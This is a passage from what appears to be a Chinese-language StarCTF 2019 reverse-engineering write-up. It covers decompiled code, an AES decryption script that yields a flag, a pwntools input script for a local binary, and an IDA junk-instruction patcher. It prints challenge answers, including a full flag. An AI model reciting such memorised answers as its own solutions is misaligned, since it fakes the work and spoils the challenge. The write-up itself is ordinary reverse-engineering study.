class="keyword">case</span> <span class="number">0x2C</span>u:</span><br><span class="line">           v30 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v30) = box[<span class="number">29</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x2D</span>u:</span><br><span class="line">           v31 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v31) = box[<span class="number">30</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x2E</span>u:</span><br><span class="line">           v32 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v32) = box[<span class="number">31</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x2F</span>u:</span><br><span class="line">           v33 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v33) = box[<span class="number">32</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">           v34 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v34) = box[<span class="number">33</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x31</span>u:</span><br><span class="line">           v35 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v35) = box[<span class="number">34</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x32</span>u:</span><br><span class="line">           v36 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v36) = box[<span class="number">35</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>则解密脚本如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = b<span class="string">&quot;\x2B\x7E\x15\x16\x28\xAE\xD2\xA6\xAB\xF7\x15\x88\x09\xCF\x4F\x3C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># print(len(key))</span></span><br><span class="line"></span><br><span class="line">cmp = [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,       <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAE</span>, <span class="number">0x46</span>, <span class="number">0x14</span>, <span class="number">0xF8</span>,       <span class="number">0x2A</span>, <span class="number">0x40</span>, <span class="number">0xCF</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xFE</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x06</span>,       <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x23</span>, <span class="number">0xFA</span>, <span class="number">0xC7</span>, <span class="number">0x26</span>, <span class="number">0xE8</span>, <span class="number">0x61</span>, <span class="number">0xD9</span>, <span class="number">0xC3</span>,       <span class="number">0xA9</span>, <span class="number">0x3C</span>, <span class="number">0x45</span>, <span class="number">0x70</span>, <span class="number">0x1A</span>, <span class="number">0xC7</span>, <span class="number">0xF0</span>, <span class="number">0x3D</span>, <span class="number">0xDF</span>, <span class="number">0xBE</span>,       <span class="number">0xBC</span>, <span class="number">0x16</span>, <span class="number">0xAB</span>, <span class="number">0x6E</span>, <span class="number">0x37</span>, <span class="number">0xAC</span>, <span class="number">0x14</span>, <span class="number">0x8B</span>, <span class="number">0x9C</span>, <span class="number">0x94</span>,       <span class="number">0xF7</span>, <span class="number">0x5D</span>, <span class="number">0x62</span>, <span class="number">0x78</span>, <span class="number">0xFC</span>, <span class="number">0x16</span>, <span class="number">0x98</span>, <span class="number">0x1D</span>, <span class="number">0xB2</span>, <span class="number">0x31</span>,       <span class="number">0xD3</span>, <span class="number">0x5A</span>, <span class="number">0xDC</span>, <span class="number">0x3A</span>, <span class="number">0x60</span>, <span class="number">0x86</span>, <span class="number">0x9A</span>, <span class="number">0xCA</span>, <span class="number">0x7B</span>, <span class="number">0xA3</span>,       <span class="number">0xB5</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xB2</span>, <span class="number">0xD9</span>, <span class="number">0xFF</span>, <span class="number">0xD2</span>, <span class="number">0x09</span>, <span class="number">0xD4</span>, <span class="number">0x77</span>,       <span class="number">0xD7</span>, <span class="number">0x3D</span>, <span class="number">0xC0</span>, <span class="number">0x56</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0xB6</span>, <span class="number">0x9B</span>, <span class="number">0x42</span>, <span class="number">0x6C</span>,       <span class="number">0xE8</span>, <span class="number">0xA2</span>, <span class="number">0x77</span>, <span class="number">0xE3</span>, <span class="number">0x99</span>, <span class="number">0xAC</span>, <span class="number">0x32</span>, <span class="number">0x40</span>, <span class="number">0x91</span>, <span class="number">0xA9</span>,       <span class="number">0x2A</span>, <span class="number">0x86</span>, <span class="number">0xF3</span>, <span class="number">0xFA</span>, <span class="number">0x47</span>, <span class="number">0x3C</span>, <span class="number">0xC3</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x9B</span>,       <span class="number">0xE8</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0xD0</span>, <span class="number">0xD4</span>, <span class="number">0x30</span>, <span class="number">0x5A</span>, <span class="number">0x9E</span>, <span class="number">0x8D</span>, <span class="number">0x52</span>,       <span class="number">0x9B</span>, <span class="number">0xA3</span>, <span class="number">0xFB</span>, <span class="number">0xAD</span>, <span class="number">0xB6</span>, <span class="number">0x44</span>, <span class="number">0x3F</span>, <span class="number">0x72</span>, <span class="number">0x83</span>, <span class="number">0x9C</span>,       <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x48</span>, <span class="number">0xFE</span>, <span class="number">0x86</span>, <span class="number">0x84</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x4E</span>,       <span class="number">0xED</span>, <span class="number">0xFF</span>, <span class="number">0xAC</span>, <span class="number">0x44</span>, <span class="number">0x19</span>, <span class="number">0x23</span>, <span class="number">0x84</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0xCA</span>]</span><br><span class="line"></span><br><span class="line">append = [<span class="number">0x61</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x86</span>, <span class="number">0x31</span>, <span class="number">0xAB</span>, <span class="number">0x6E</span>, <span class="number">0xAF</span>, <span class="number">0xB1</span>, <span class="number">0x14</span>,          <span class="number">0xFE</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x3D</span>, <span class="number">0x1E</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">box = &#123;<span class="number">0x82</span>:<span class="string">&quot;a&quot;</span>, <span class="number">0x05</span>:<span class="string">&quot;b&quot;</span>, <span class="number">0x86</span>:<span class="string">&quot;c&quot;</span>, <span class="number">0x8A</span>:<span class="string">&quot;d&quot;</span>, <span class="number">0x0B</span>:<span class="string">&#x27;e&#x27;</span>, <span class="number">0x11</span>:<span class="string">&#x27;f&#x27;</span>, <span class="number">0x96</span>:<span class="string">&#x27;g&#x27;</span>, <span class="number">0x1D</span>:<span class="string">&#x27;h&#x27;</span>, <span class="number">0x27</span>:<span class="string">&#x27;i&#x27;</span>, <span class="number">0xA9</span>:<span class="string">&#x27;j&#x27;</span>,       <span class="number">0x2B</span>:<span class="string">&#x27;k&#x27;</span>, <span class="number">0xB1</span>:<span class="string">&#x27;l&#x27;</span>, <span class="number">0xF3</span>:<span class="string">&#x27;m&#x27;</span>, <span class="number">0x5E</span>:<span class="string">&#x27;n&#x27;</span>, <span class="number">0x37</span>:<span class="string">&#x27;o&#x27;</span>, <span class="number">0x38</span>:<span class="string">&#x27;p&#x27;</span>, <span class="number">0xC2</span>:<span class="string">&#x27;q&#x27;</span>, <span class="number">0x47</span>:<span class="string">&#x27;r&#x27;</span>, <span class="number">0x4E</span>:<span class="string">&#x27;s&#x27;</span>, <span class="number">0x4F</span>:<span class="string">&#x27;t&#x27;</span>,       <span class="number">0xD6</span>:<span class="string">&#x27;u&#x27;</span>, <span class="number">0x58</span>:<span class="string">&#x27;v&#x27;</span>, <span class="number">0xDE</span>:<span class="string">&#x27;w&#x27;</span>, <span class="number">0xE2</span>:<span class="string">&#x27;x&#x27;</span>, <span class="number">0xE5</span>:<span class="string">&#x27;y&#x27;</span>, <span class="number">0xE6</span>:<span class="string">&#x27;z&#x27;</span>, <span class="number">0x67</span>:<span class="string">&#x27;0&#x27;</span>, <span class="number">0x6B</span>:<span class="string">&#x27;1&#x27;</span>, <span class="number">0xEC</span>:<span class="string">&#x27;2&#x27;</span>, <span class="number">0xED</span>:<span class="string">&#x27;3&#x27;</span>,       <span class="number">0x6F</span>:<span class="string">&#x27;4&#x27;</span>, <span class="number">0xF2</span>:<span class="string">&#x27;5&#x27;</span>, <span class="number">0x73</span>:<span class="string">&#x27;6&#x27;</span>, <span class="number">0xF5</span>:<span class="string">&#x27;7&#x27;</span>, <span class="number">0x77</span>:<span class="string">&#x27;8&#x27;</span>, <span class="number">0x7F</span>:<span class="string">&#x27;9&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Cipher = b<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in cmp:</span><br><span class="line">    Cipher += bytes([i])</span><br><span class="line"></span><br><span class="line">obj = AES.<span class="keyword">new</span>(key, AES.MODE_CBC, key)</span><br><span class="line">plain = obj.decrypt(Cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in plain:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    flag += box[i]</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">  except KeyError:</span><br><span class="line">      <span class="keyword">if</span> flag[index<span class="number">-1</span>] != <span class="string">&quot;_&quot;</span>:</span><br><span class="line">              flag += <span class="string">&#x27;_&#x27;</span></span><br><span class="line">              index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line">#yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3</span><br></pre></td></tr></table></figure><p>由于append中有可转化字符, 所以打印出来后手动除去hhhhh……..</p><p>最终flag如下:</p><p>*CTF{yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3}</p><h2 id="fanoGo"><a href="#fanoGo" class="headerlink" title="fanoGo"></a>fanoGo</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/StarCTF/fanGo.zip">fanoGo</a></p><p>本题一路连猜带蒙。。。</p><p>根据输出<code>Say something:</code>找到主要函数…….看不懂, 开始调试:</p><p>输入后会经过<code>fano___Fano__Decode</code>函数进行解码(为什么是解码名字说的很清楚hhh), 解码后长度为0x15A, 由该语句确认:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( e._type == (runtime__type_0 *)<span class="number">0x15A</span> )</span><br></pre></td></tr></table></figure><p>后进入runtime_eqstring()函数进行对比, 汇编代码如下0.0:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000456B83                 cmp     rbx, 40h</span><br><span class="line">.text:0000000000456B87                 jb      short loc_456BC6</span><br><span class="line">.text:0000000000456B89                 vmovdqu ymm0, ymmword ptr [rsi]</span><br><span class="line">.text:0000000000456B8D                 vmovdqu ymm1, ymmword ptr [rdi]</span><br><span class="line">.text:0000000000456B91                 vmovdqu ymm2, ymmword ptr [rsi+20h]</span><br><span class="line">.text:0000000000456B96                 vmovdqu ymm3, ymmword ptr [rdi+20h]</span><br><span class="line">.text:0000000000456B9B                 vpcmpeqb ymm4, ymm0, ymm1</span><br><span class="line">.text:0000000000456B9F                 vpcmpeqb ymm5, ymm3, ymm2</span><br><span class="line">.text:0000000000456BA3                 vpand   ymm6, ymm5, ymm4</span><br><span class="line">.text:0000000000456BA7                 vpmovmskb edx, ymm6</span><br><span class="line">.text:0000000000456BAB                 add     rsi, 40h</span><br><span class="line">.text:0000000000456BAF                 add     rdi, 40h</span><br><span class="line">.text:0000000000456BB3                 sub     rbx, 40h</span><br><span class="line">.text:0000000000456BB7                 cmp     edx, 0FFFFFFFFh</span><br><span class="line">.text:0000000000456BBD                 jz      short loc_456B83</span><br></pre></td></tr></table></figure><p>而调试着可以发现对比对象就是这串:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;If you cannot read all your books...fondle them---peer into them, let them fall open where they w&quot;</span><br><span class="line">                       &quot;ill, read from the first sentence that arrests the eye, set them back on the shelves with your ow&quot;</span><br><span class="line">                       &quot;n hands, arrange them on your own plan so that you at least know where they are. Let them be your&quot;</span><br><span class="line">                       &quot; friends; let them, at any rate, be your acquaintances.&quot;</span><br></pre></td></tr></table></figure><p>尝试搜索Encode函数, 还真有hhhhhh, patch上去, 将上面那串进行编码就得到我们的输入。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/2019starctf-inputflag.png" alt="2019starctf-inputflag"></p><p>脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exp = process(<span class="string">&quot;./fanoGo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmp = &quot;\x49\x66\x20\x79\x6F\x75\x20\x63\x61\x6E\x6E\x6F\x74\x20\x72\x65\x61\x64\x20\x61\x6C\x6C\x20\x79\x6F\x75\x72\x20\x62\x6F\x6F\x6B\x73\x2E\x2E\x2E\x66\x6F\x6E\x64\x6C\x65\x20\x74\x68\x65\x6D\x2D\x2D\x2D\x70\x65\x65\x72\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x6D\x2C\x20\x6C\x65\x74\x20\x74\x68\x65\x6D\x20\x66\x61\x6C\x6C\x20\x6F\x70\x65\x6E\x20\x77\x68\x65\x72\x65\x20\x74\x68\x65\x79\x20\x77\x69\x6C\x6C\x2C\x20\x72\x65\x61\x64\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x66\x69\x72\x73\x74\x20\x73\x65\x6E\x74\x65\x6E\x63\x65\x20\x74\x68\x61\x74\x20\x61\x72\x72\x65\x73\x74\x73\x20\x74\x68\x65\x20\x65\x79\x65\x2C\x20\x73\x65\x74\x20\x74\x68\x65\x6D\x20\x62\x61\x63\x6B\x20\x6F\x6E\x20\x74\x68\x65\x20\x73\x68\x65\x6C\x76\x65\x73\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6F\x77\x6E\x20\x68\x61\x6E\x64\x73\x2C\x20\x61\x72\x72\x61\x6E\x67\x65\x20\x74\x68\x65\x6D\x20\x6F\x6E\x20\x79\x6F\x75\x72\x20\x6F\x77\x6E\x20\x70\x6C\x61\x6E\x20\x73\x6F\x20\x74\x68\x61\x74\x20\x79\x6F\x75\x20\x61\x74\x20\x6C\x65\x61\x73\x74\x20\x6B\x6E\x6F\x77\x20\x77\x68\x65\x72\x65\x20\x74\x68\x65\x79\x20\x61\x72\x65\x2E\x20\x4C\x65\x74\x20\x74\x68\x65\x6D\x20\x62\x65\x20\x79\x6F\x75\x72\x20\x66\x72\x69\x65\x6E\x64\x73\x3B\x20\x6C\x65\x74\x20\x74\x68\x65\x6D\x2C\x20\x61\x74\x20\x61\x6E\x79\x20\x72\x61\x74\x65\x2C\x20\x62\x65\x20\x79\x6F\x75\x72\x20\x61\x63\x71\x75\x61\x69\x6E\x74\x61\x6E\x63\x65\x73\x2E\x00&quot;</span></span><br><span class="line"></span><br><span class="line">cmp = <span class="string">&quot;\x2B\x60\xC3\xBE\xC2\xB7\xC2\x82\xC2\x89\xC3\x95\x5B\xC2\x87\x2A\x69\x13\xC2\x96\x51\xC3\xBD\x6F\x32\x28\x5A\xC3\x92\x74\xC2\x94\xC2\x94\xC2\x95\xC2\x96\xC2\xA4\xC3\x8A\xC2\xA3\xC3\x8E\xC2\xB3\x24\x24\x24\xC2\xBA\xC2\xAE\x46\x2B\xC2\xAC\x3C\xC3\xAB\x32\x23\x2A\xC3\xB0\xC3\xB3\xC2\xAC\xC3\x85\xC2\x87\x2C\xC2\xA3\x6B\xC2\xAD\x0F\xC3\x87\x5C\xC2\xA8\xC3\xB3\xC2\xAF\xC3\xA1\xC3\xB9\x12\xC3\x8A\x44\x72\xC2\xA6\xC2\x91\x66\x6D\x31\xC3\xA7\x51\x64\x67\x78\x75\x6B\xC2\x96\xC2\x91\x51\xC3\xA7\x3E\x13\xC3\x8E\x57\x7B\x47\xC2\x9D\x45\x7F\x29\x11\xC3\x95\xC3\xA1\xC3\xA7\x59\xC2\x8A\x06\xC2\x8C\xC2\x91\xC2\xB5\x0F\x3A\xC2\x8E\xC2\xBA\xC3\x8B\xC3\xAA\xC3\xA8\xC3\xBC\xC2\x8E\x71\xC3\xBD\x6F\x32\x36\xC3\xB9\x42\xC3\xA7\x49\xC3\x92\x22\x79\xC3\x89\xC3\x93\x54\x79\xC3\x96\x63\x6A\x1F\xC3\x96\xC3\xB3\x23\x6F\xC2\x94\x37\xC2\x94\xC3\xA8\x76\xC3\x83\xC3\x8E\x7C\x3F\xC2\xAD\xC3\xA0\xC2\x9F\x0C\xC2\xAA\x7B\xC3\x83\x26\xC2\xAD\xC3\xB0\x7E\x3A\xC3\xA5\x47\xC2\x9D\x7F\x09\xC3\xA5\x49\x44\xC2\xB0\xC2\xAF\x0F\x3A\xC3\x8C\x50\x51\xC3\xBD\x6F\x32\x2C\xC3\x8C\x2D\x27\x49\xC3\xA3\x2A\xC3\xB0\xC3\xB3\xC2\xAC\xC3\x88\xC2\x89\xC3\xB0\xC2\x9D\x7E\x1C\xC2\x9F\x29\x11\x41\x47\xC3\xB5\xC2\xBC\xC3\x88\xC2\x9A\x38\xC3\xB0\xC3\xA2\xC2\xB8\xC3\xA9\x15\xC3\x92\x50&quot;</span></span><br><span class="line"></span><br><span class="line">exp.sendafter(<span class="string">&quot;Say something:&quot;</span>, cmp)</span><br><span class="line"></span><br><span class="line">exp.interactive()</span><br></pre></td></tr></table></figure><p>由于是后面做的, 端口已经关了, 所以只能本地打了hhhhhh</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190714132914.png" alt="local"></p><h2 id="Matr1x"><a href="#Matr1x" class="headerlink" title="Matr1x"></a>Matr1x</h2><p>题目:<a href="hhttps://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/StarCTF/Matr1x.zip">Matr1x</a></p><p>题目一打开, 通过start找到main函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00002620 start           proc near               ; DATA XREF: LOAD:00000018↑o</span><br><span class="line">.text:00002620                 xor     ebp, ebp</span><br><span class="line">.text:00002622                 pop     esi</span><br><span class="line">.text:00002623                 mov     ecx, esp</span><br><span class="line">.text:00002625                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:00002628                 push    eax</span><br><span class="line">.text:00002629                 push    esp             ; stack_end</span><br><span class="line">.text:0000262A                 push    edx             ; rtld_fini</span><br><span class="line">.text:0000262B                 call    sub_2652</span><br><span class="line">.text:00002630                 add     ebx, 10994h</span><br><span class="line">.text:00002636                 lea     eax, (nullsub_1 - 12FC4h)[ebx]</span><br><span class="line">.text:0000263C                 push    eax             ; fini</span><br><span class="line">.text:0000263D                 lea     eax, (sub_11250 - 12FC4h)[ebx]</span><br><span class="line">.text:00002643                 push    eax             ; init</span><br><span class="line">.text:00002644                 push    ecx             ; ubp_av</span><br><span class="line">.text:00002645                 push    esi             ; argc</span><br><span class="line">.text:00002646                 push    ds:(off_12FF8 - 12FC4h)[ebx] ; main</span><br><span class="line">.text:0000264C                 call    ___libc_start_main</span><br><span class="line">.text:00002651                 hlt</span><br><span class="line">.text:00002651 start           endp</span><br><span class="line">.text:00002651</span><br></pre></td></tr></table></figure><h3 id="去花指令和冗余代码"><a href="#去花指令和冗余代码" class="headerlink" title="去花指令和冗余代码"></a>去花指令和冗余代码</h3><p>…..一堆花指令和冗余代码。那就去掉咯。</p><p>其中, 除去全局变量的代码如果之间在全局变量赋值处patch会出问题, 来自Apeng大佬的指导:</p><div class="note default flat"><p>问题出在pie的重定位上了, 由于程序原本开启了pie, 对全局变量引用的时候地址是会变的, 所以elf运行的时候会把所有这些全局变量的引用都patch成重定位之后的。而他查找的方式肯定不是根据语句来查, 可能是有个表, 所以所有这些全局变量都会被patch。所以只需要把mov eax, 0xxx这句话patch到其他地方就行了</p></div><p>所以稍微修改了一下, 最终如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x00002620</span></span><br><span class="line">end = <span class="number">0x00011320</span></span><br><span class="line">addr = bg</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span> end &gt; begin:</span><br><span class="line">        PatchByte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr + ItemSize(addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_global</span>(<span class="params">addr, eax</span>):</span></span><br><span class="line">    flag = GetMnem(addr)</span><br><span class="line">    ebx = GetOperandValue(addr, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="string">&quot;xor&quot;</span>:</span><br><span class="line">        eax ^= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;shl&quot;</span>:</span><br><span class="line">        eax &lt;&lt;= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;sub&quot;</span>:</span><br><span class="line">        eax -= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;add&quot;</span>:</span><br><span class="line">        eax += ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;and&quot;</span>:</span><br><span class="line">        eax &amp;= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;shr&quot;</span>:</span><br><span class="line">        eax &gt;&gt;= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;or&quot;</span>:</span><br><span class="line">        eax |= ebx</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eax &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">OperandValue = [<span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;shr&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;shl&#x27;</span>, <span class="string">&#x27;xor&#x27;</span>]</span><br><span class="line">Register = [<span class="string">&#x27;ebx&#x27;</span>, <span class="string">&#x27;ecx&#x27;</span>, <span class="string">&#x27;edx&#x27;</span>, <span class="string">&#x27;eax&#x27;</span>]</span><br><span class="line">Patch_jnz = [<span class="string">&#x27;xor&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>]</span><br><span class="line"></span><br><span class="line">dest_addr = <span class="number">0</span></span><br><span class="line">_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="built_in">next</span> = next_instr(addr)</span><br><span class="line">    MakeCode(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> GetMnem(addr) <span class="keyword">in</span> Patch_jnz <span class="keyword">and</span> <span class="string">&#x27;jnz&#x27;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>):</span><br><span class="line">        <span class="keyword">if</span> GetOperandValue(addr, <span class="number">0</span>) == GetOperandValue(addr, <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_jnz: %x&quot;</span> % addr)</span><br><span class="line">            dest_addr = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            patch_nop(<span class="built_in">next</span>, dest_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;call    $+5&quot;</span> == GetDisasm(addr):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;pop     eax&quot;</span> == GetDisasm(<span class="built_in">next</span>):</span><br><span class="line">            dest_addr = addr</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                dest_addr = next_instr(dest_addr)</span><br><span class="line">                MakeCode(dest_addr)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;jmp&quot;</span> <span class="keyword">in</span> GetMnem(dest_addr):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_call: %x&quot;</span> % addr)</span><br><span class="line">                patch_nop(addr, dest_addr)</span><br><span class="line">                PatchByte(dest_addr, <span class="number">0xE8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xchg&quot;</span> <span class="keyword">in</span> GetMnem(addr):</span><br><span class="line">        <span class="keyword">if</span> GetOperandValue(addr, <span class="number">1</span>) == GetOperandValue(addr, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_xchg: %x&quot;</span> % addr)</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;jmp     $+5&quot;</span> == GetDisasm(addr):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>):</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_jmp: %x&quot;</span> % addr)</span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            addr = <span class="built_in">next</span></span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">            PatchByte(addr, <span class="number">0xC3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;[ebp&quot;</span> <span class="keyword">in</span> GetDisasm(addr) <span class="keyword">and</span> GetOperandValue(addr, <span class="number">1</span>) &gt; <span class="number">0x10000</span> <span class="keyword">and</span> GetOperandValue(addr, <span class="number">1</span>) &lt; (<span class="number">0xFFFFFFFF</span> - <span class="number">0x10000</span>):</span><br><span class="line">        patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_ebp: %x&quot;</span> % addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x0001329C</span> &gt;= GetOperandValue(addr, <span class="number">1</span>) &gt;= <span class="number">0x00013280</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess: %x&quot;</span> % addr)</span><br><span class="line">        eax = Dword(GetOperandValue(addr, <span class="number">1</span>))</span><br><span class="line">        _addr = addr</span><br><span class="line">        Reg = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">while</span> GetMnem(<span class="built_in">next</span>) <span class="keyword">in</span> OperandValue:</span><br><span class="line">            eax = patch_global(<span class="built_in">next</span>, eax)</span><br><span class="line">            _addr = <span class="built_in">next</span></span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            MakeCode(_addr)</span><br><span class="line">            MakeCode(<span class="built_in">next</span>)</span><br><span class="line">            <span class="keyword">if</span> GetOperandValue(_addr, <span class="number">0</span>) != GetOperandValue(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> GetOpnd(<span class="built_in">next</span>, <span class="number">1</span>) <span class="keyword">in</span> Register:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> GetOpnd(_addr, <span class="number">0</span>) == GetOpnd(_addr, <span class="number">1</span>):</span><br><span class="line">            Reg = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> Reg != -<span class="number">1</span>:</span><br><span class="line">            addr = next_instr(addr)</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">        <span class="keyword">if</span> Reg == <span class="number">3</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xBB</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">        <span class="keyword">elif</span> Reg == <span class="number">2</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xBA</span>)</span><br><span class="line">            PatchDword(addr + <span 